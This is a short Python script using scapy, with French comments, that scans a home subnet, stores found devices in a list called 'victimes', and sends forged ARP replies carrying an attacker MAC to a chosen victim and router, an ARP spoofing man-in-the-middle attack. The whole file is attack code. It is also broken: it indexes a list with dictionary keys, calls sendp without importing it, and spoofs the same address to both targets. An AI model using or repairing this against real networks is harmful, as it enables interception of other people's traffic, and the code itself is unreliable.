#!/usr/bin/env python3
from scapy.all import ARP, Ether, srp, get_if_hwaddr

packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24") # Cree les paquets

victimes = [] # tableau des appareils presents

for sent, received in srp(packet, timeout=3)[0]:
    victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
# Ajoute les infos de chaque nouvel appareil trouve dans le tableau

print("\n" + "Available devices in the network :" + "\n" + "IP" + " "*18 + "MAC")
for victime in victimes: # affiche les adresse ip et mac des appareils connectes au reseau qui sont dans le tableau victimes
    print(victime['ip'])
    print(victime['mac'] + "\n")

for i in victimes:
    if i['ip'] == "192.168.1.12":
        passerelle_ip = victimes['ip'][i]
        passerelle_mac = victimes['mac'][i]
    if i['ip'] == "192.168.1.11":
        victime_ip = victimes['ip'][i]
        victime_mac = victimes['mac'][i]
    if i['ip'] == "192.168.1.254": 
        routeur_ip = victimes['ip'][i]       
        routeur_mac = victimes['mac'][i]
atk_mac = '08:00:27:c0:36:64'

nb_packets = 0
while nb_packets < 100:
    spoof_arp_victime = Ether(src=atk_mac)/ARP(op=2, pdst=victime_ip, hwdst=victime_mac, psrc=passerelle_ip)
    spoof_arp_routeur = Ether(src=atk_mac)/ARP(op=2, pdst=routeur_ip, hwdst=routeur_mac, psrc=passerelle_ip)
    send_spoof1 = sendp(spoof_arp_routeur)
    send_spoof2 = sendp(spoof_arp_victime)
    nb_packets += 2

print(nb_packets)